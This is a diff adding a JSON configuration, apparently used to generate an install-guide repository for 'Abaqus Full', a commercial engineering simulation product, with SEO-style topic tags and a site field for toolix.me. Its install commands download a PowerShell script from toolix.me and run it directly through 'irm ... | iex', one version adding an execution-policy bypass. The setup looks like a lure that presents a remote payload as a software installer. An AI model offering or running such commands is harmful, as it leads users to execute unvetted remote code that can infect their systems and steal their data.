@@ -1,0 +1,29 @@
+{
+  "repo": "Abaqus-Full",
+  "product": "Abaqus Full",
+  "product_title": "Abaqus",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-abaqus",
+    "abaqus-app",
+    "finite-element",
+    "engineering-analysis",
+    "developer-tools",
+    "database-tools",
+    "scientific-computing",
+    "simulation-software",
+    "abaqus-windows-tool",
+    "abaqus-modeling-tool",
+    "abaqus",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
